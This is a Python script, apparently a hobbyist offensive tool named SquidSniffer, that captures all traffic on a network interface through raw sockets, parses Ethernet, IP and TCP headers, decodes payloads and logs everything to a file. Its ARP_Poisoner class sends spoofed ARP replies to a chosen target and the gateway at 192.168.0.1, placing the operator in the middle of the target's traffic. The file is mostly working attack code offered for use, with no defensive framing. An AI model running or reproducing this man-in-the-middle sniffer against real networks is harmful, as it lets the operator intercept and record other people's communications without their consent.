import socket, binascii, struct, os, sys, time, threading
from optparse import OptionParser
from scapy.all import *

class OptionParse:
    def __init__(self):
        self.arg_parse()
    def logo(self):
        print("""
  _____             _     _  _____       _  __  __                 __   ___  
 / ____|           (_)   | |/ ____|     (_)/ _|/ _|               /_ | / _ \ 
| (___   __ _ _   _ _  __| | (___  _ __  _| |_| |_ ___ _ __  __   _| || | | |
 \___ \ / _` | | | | |/ _` |\___ \| '_ \| |  _|  _/ _ \ '__| \ \ / / || | | |
 ____) | (_| | |_| | | (_| |____) | | | | | | | ||  __/ |     \ V /| || |_| |
|_____/ \__, |\__,_|_|\__,_|_____/|_| |_|_|_| |_| \___|_|      \_/ |_(_)___/ 
           | |                                                               
           |_|
Packet-Sniffing Script by DrSquid""")
    def usage(self):
        self.logo()
        print("""
[+] Option Parsing Help:
[+] -t, --translate - Script translate any incoming traffic and displays it in the output.
[+] -r, --raw       - Script displays raw network traffic in output.
[+] -l, --log       - Script Logs Network Traffic headers.
[+] -i, --info      - Shows this message.
[+] -p, --poison    - ARP Poisons a specified IP.
[+] -a, --address   - Only Display Traffic from the provided IP Address.

[+] Usage:
[+] python3 SquidSniffer.py -t -r
[+] python3 SquidSniffer.py -t -a <ipaddress> -p <ipaddress>
[+] python3 SquidSniffer.py -i
        """)
    def arg_parse(self):
        args = OptionParser()
        args.add_option("-t","--translate", action="store_true", dest="translate")
        args.add_option("-r","--raw",action="store_true",dest="raw")
        args.add_option("-i","--info",action="store_true",dest="info")
        args.add_option("-l", "--log", action="store_true", dest="log")
        args.add_option("-p", "--poison", dest="poisontarget")
        args.add_option("-a", "--address", dest="address")
        opt,arg = args.parse_args()
        if opt.info is not None:
            self.usage()
            sys.exit()
        else:
            pass
        if opt.poisontarget is not None:
            poison = opt.poisontarget
        else:
            poison = None
        if opt.address is not None:
            address = opt.address
        else:
            address = None
        if opt.translate is not None:
            translate = True
        else:
            translate = False
        if opt.log is not None:
            log = True
        else:
            log = False
        if opt.raw is not None:
            raw = True
        else:
            raw = False
        self.logo()

        sniffer = PacketSniffer(translate, raw, log, poison, address)
        print("[+] Preparing to recieve packets......\n")
        time.sleep(5)
        sniffing = threading.Thread(target=sniffer.sniffing)
        sniffing.start()

class ARP_Poisoner:
    def __init__(self, targ_ip, gate_ip):
        self.targ_ip = targ_ip
        self.gate_ip = gate_ip
    def obtain_macaddress(self, ip):
        arpbroadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip)
        recv = srp(arpbroadcast, timeout=2, verbose=False)
        return recv[0][0][1].hwsrc
    def send_arp_pkt(self, targetip, targetmac, sourceip):
        packet = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
        send(packet, verbose=False)
    def restore_arp(self, targetip, targetmac, sourceip, sourcemac):
        packet = ARP(op=2, hwsrc=sourcemac, psrc=sourceip, hwdst=targetmac, pdst=targetip)
        send(packet, verbose=False)
        print(f"[+] ARP Table Restored For: {targetip}")
    def arp_poison(self):
        try:
            self.gate_mac = self.obtain_macaddress(self.gate_ip)
            print(f"[+] Gateway MAC: {self.gate_mac}")
        except:
            print(f"[+] Unable to Obtain MAC Address for {self.gate_ip}")
            sys.exit()
        try:
            self.targ_mac = self.obtain_macaddress(self.targ_ip)
            print(f"[+] Target MAC: {self.targ_mac}")
        except:
            print(f"[+] Unable to Obtain MAC Address for {self.targ_ip}")
            sys.exit()
        print("\n[+] Sending ARP-Poisoning Packets to Targets\n[+] Do CTRL+C To Stop Arp Poisoning.\n")
        while True:
            try:
                self.send_arp_pkt(self.targ_ip, self.targ_mac, self.gate_ip)
                self.send_arp_pkt(self.gate_ip, self.gate_mac, self.targ_ip)
            except:
                self.restore_arp(self.gate_ip, self.gate_mac, self.targ_ip, self.targ_mac)
                self.restore_arp(self.targ_ip, self.targ_mac, self.gate_ip, self.gate_mac)
                break
class PacketSniffer:
    def __init__(self, translate=False, raw=False, log=False, poison=None, address=None):
        self.os = os.name
        self.poison = poison
        self.logger = bool(log)
        self.translat = bool(translate)
        self.address = address
        self.raw = bool(raw)
        self.hastarget = False
        if self.address is not None:
            try:
                self.hastarget = True
                self.targ_mac = ARP_Poisoner.obtain_macaddress(None, self.address)
                print(f"[+] Obtained MAC Address of {self.address}: {self.targ_mac}")
            except:
                print(f"[+] Unable to Obtain MAC Address of {self.address}.")
                print("[+] Check you arguements.")
                sys.exit()
        self.translationfile = ['ÿ ff', 'a 61', 'b 62', 'c 63', 'd 64', 'e 65', 'f 66', 'g 67', 'h 68', 'i 69', 'j 6a', 'k 6b', 'l 6c', 'm 6d', 'n 6e', 'o 6f', 'p 70', 'q 71', 'r 72', 's 73', 't 74', 'u 75', 'v 76', 'w 77', 'x 78', 'y 79', 'z 7a', 'A 41', 'B 42', 'C 43', 'D 44', 'E 45', 'F 46', 'G 47', 'H 48', 'I 49', 'J 4a', 'K 4b', 'L 4c', 'M 4d', 'N 4e', 'O 4f', 'P 50', 'Q 51', 'R 52', 'S 53', 'T 54', 'U 55', 'V 56', 'W 57', 'X 58', 'Y 59', 'Z 5a', '0 30', '1 31', '2 32', '3 33', '4 34', '5 35', '6 36', '7 37', '8 38', '9 39', 'ˆ 88', '. 00', 'þ fe', '¶ b6', 'ž 9e', 'Ñ d1', 'Ë cb', '@ 40', ': 3a',"' 27",'" 22', "/ 2f", '\\ 5c', '$ 24', '% 25', '^ 5e', '& 26', '* 2a', '( 28', ') 29', '[ 5b', '] 5d', '{ 7b', '} 7d', 'ù f9', '© a9', 'À c0', 'ª aa', '¾ be', 'Û db', 'Ç c7']
        self.logfile = "captured_traffic.txt"
        print(f"[+] All Traffic Will be Logged.\n[+] Log File: {self.logfile}")
        if self.poison is not None:
            self.arp_poison = ARP_Poisoner(self.poison, "192.168.0.1")
            self.arp_poisoner = threading.Thread(target=self.arp_poison.arp_poison)
            self.arp_poisoner.start()
        if self.os == "nt":
            try:
                self.sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
                self.sniffer.bind((socket.gethostbyname(socket.gethostname()), 0))
                self.sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                self.sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
            except:
                print("[+] Error with binding socket.")
                print("[+] Run this script as admin!")
                sys.exit()
        else:
            self.sniffer = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
    def eth_header(self, data):
        storeobj = data
        storeobj = struct.unpack("!6s6sH", storeobj)
        destination_mac = binascii.hexlify(storeobj[0])
        source_mac = binascii.hexlify(storeobj[1])
        eth_protocol = storeobj[2]
        dest_mac = ""
        src_mac = ""
        try:
            item = 0
            for i in source_mac.decode():
                src_mac += i
                item += 1
                if item == 2:
                    item = 0
                    src_mac += ":"
            item = 0
            for i in destination_mac.decode():
                dest_mac += i
                item += 1
                if item == 2:
                    item = 0
                    dest_mac += ":"
        except:
            pass
        data = {"Source Mac": src_mac,
                "Destination Mac": dest_mac,
                "Protocol": eth_protocol}
        return data

    def ip_header(self, data):
        storeobj = struct.unpack("!BBHHHBBH4s4s", data)
        version = storeobj[0]
        tos = storeobj[1]
        total_length = storeobj[2]
        identification = storeobj[3]
        fragment_Offset = storeobj[4]
        ttl = storeobj[5]
        protocol = storeobj[6]
        header_checksum = storeobj[7]
        source_address = socket.inet_ntoa(storeobj[8])
        destination_address = socket.inet_ntoa(storeobj[9])

        data = {'Version': version,
                "Tos": tos,
                "Total Length": total_length,
                "Identification": identification,
                "Fragment": fragment_Offset,
                "TTL": ttl,
                "Protocol": protocol,
                "Header CheckSum": header_checksum,
                "Source Address": source_address,
                "Destination Address": destination_address}
        return data

    def tcp_header(self, data):
        storeobj = struct.unpack('!HHLLBBHHH', data)
        source_port = storeobj[0]
        destination_port = storeobj[1]
        sequence_number = storeobj[2]
        acknowledge_number = storeobj[3]
        offset_reserved = storeobj[4]
        tcp_flag = storeobj[5]
        window = storeobj[6]
        checksum = storeobj[7]
        urgent_pointer = storeobj[8]
        data = {"Source Port": source_port,
                "Destination Port": destination_port,
                "Sequence Number": sequence_number,
                "Acknowledge Number": acknowledge_number,
                "Offset & Reserved": offset_reserved,
                "TCP Flag": tcp_flag,
                "Window": window,
                "CheckSum": checksum,
                "Urgent Pointer": urgent_pointer
                }
        return data

    def translatebyte(self, byte):
        result = ""
        flag = 0
        for i in self.translationfile:
            if byte in i:
                i = i.split()
                flag = 1
                return i[0]
        if flag == 0:
            return "."
    def translate(self, datas, src_ip, dst_ip):
        result = ""
        split_data = ""
        item = 0
        for i in datas:
            split_data += i
            item += 1
            if item == 2:
                split_data += " "
                item = 0
        for data in split_data.split():
            add = self.translatebyte(data)
            result += add
        if self.raw:
            print(f"\n[+]: Raw Network Traffic:")
            print(f" {split_data}")
        self.log(f"\n[(RAW)({src_ip})---->({dst_ip})]: {split_data}\n[(DECODED)({src_ip})---->({dst_ip})]: {result}")
        return result
    def log(self, item):
        try:
            file = open(self.logfile,"r")
            contents = file.read()
            file.close()
        except:
            pass
        file = open(self.logfile,"w")
        try:
            file.write(contents)
        except:
            pass
        file.write(item)
        file.close()
    def sniffing(self):
        while True:
            try:
                if self.hastarget:
                    desired_target = False
                    pkt = self.sniffer.recvfrom(65565)
                    self.log(f"\n\n[(RECV)] Raw Packets Received: {pkt}")
                    if self.raw:
                        print(f"\n[+] Raw Packets Recieved: {pkt}")
                    if self.logger:
                        self.log(msg)
                    for i in self.eth_header(pkt[0][0:14]).items():
                        a, b = i
                        if desired_target:
                            print(f"[+] {a} | {b}")
                        if self.targ_mac in b:
                            msg = "\n[+] Ethernet Header:"
                            print(msg)
                            print(f"[+] {a} | {b}")
                            desired_target = True
                        else:
                            break
                        if self.logger:
                            self.log(f"\n[+] {a} | {b}")
                    if desired_target:
                        msg = "\n[+] IP Header:"
                        print(msg)
                        if self.logger:
                            self.log(msg)
                        for i in self.ip_header(pkt[0][14:34]).items():
                            a, b = i
                            print(f"[+] {a} | {b}")
                            if "Source Address" in a.strip():
                                src_ip = b
                            if "Destination Address" in a.strip():
                                dst_ip = b
                            if self.logger:
                                self.log(f"\n[+] {a} | {b}")
                        msg = "\n[+] TCP Header:"
                        print(msg)
                        if self.logger:
                            self.log(msg)
                        for i in self.tcp_header(pkt[0][34:54]).items():
                            a, b = i
                            print(f"[+] {a} | {b}")
                            if self.logger:
                                self.log(f"\n[+] {a} | {b}")
                        if self.translat:
                            try:
                                translation = self.translate(binascii.hexlify(pkt[0]).decode(), src_ip, dst_ip)
                                print(
                                    "\n[+] Translation Of Network Traffic(gibberish most likely means encrypted traffic):")
                                print(" ", translation)
                            except Exception as e:
                                print("[+] Error with translation.")
                        else:
                            translation = self.translate(binascii.hexlify(pkt[0]).decode(), src_ip, dst_ip)
                else:
                    pkt = self.sniffer.recvfrom(65565)
                    self.log(f"\n\n[(RECV)] Raw Packets Received: {pkt}")
                    if self.raw:
                        print(f"\n[+] Raw Packets Recieved: {pkt}")
                    msg = "\n[+] Ethernet Header:"
                    print(msg)
                    if self.logger:
                        self.log(msg)
                    for i in self.eth_header(pkt[0][0:14]).items():
                        a, b = i
                        print(f"[+] {a} | {b}")
                        if self.logger:
                            self.log(f"\n[+] {a} | {b}")
                    msg = "\n[+] IP Header:"
                    print(msg)
                    if self.logger:
                        self.log(msg)
                    for i in self.ip_header(pkt[0][14:34]).items():
                        a, b = i
                        print(f"[+] {a} | {b}")
                        if "Source Address" in a.strip():
                            src_ip = b
                        if "Destination Address" in a.strip():
                            dst_ip = b
                        if self.logger:
                            self.log(f"\n[+] {a} | {b}")
                    msg = "\n[+] TCP Header:"
                    print(msg)
                    if self.logger:
                        self.log(msg)
                    for i in self.tcp_header(pkt[0][34:54]).items():
                        a, b = i
                        print(f"[+] {a} | {b}")
                        if self.logger:
                            self.log(f"\n[+] {a} | {b}")
                    if self.translat:
                        try:
                            translation = self.translate(binascii.hexlify(pkt[0]).decode(), src_ip, dst_ip)
                            print(
                                "\n[+] Translation Of Network Traffic(gibberish most likely means encrypted traffic):")
                            print(" ", translation)
                        except Exception as e:
                            print("[+] Error with translation.")
                    else:
                        translation = self.translate(binascii.hexlify(pkt[0]).decode(), src_ip, dst_ip)
            except KeyboardInterrupt:
                print("[+] Stopping Script......\n")
                self.arp_poison.restore_arp(self.arp_poison.gate_ip, self.arp_poison.gate_mac, self.arp_poison.targ_ip, self.arp_poison.targ_mac)
                self.arp_poison.restore_arp(self.arp_poison.targ_ip, self.arp_poison.targ_mac, self.arp_poison.gate_ip, self.arp_poison.gate_mac)
                break
            except Exception as e:
                self.log(f"\n[(ERROR]: {e}")
parser = OptionParse()
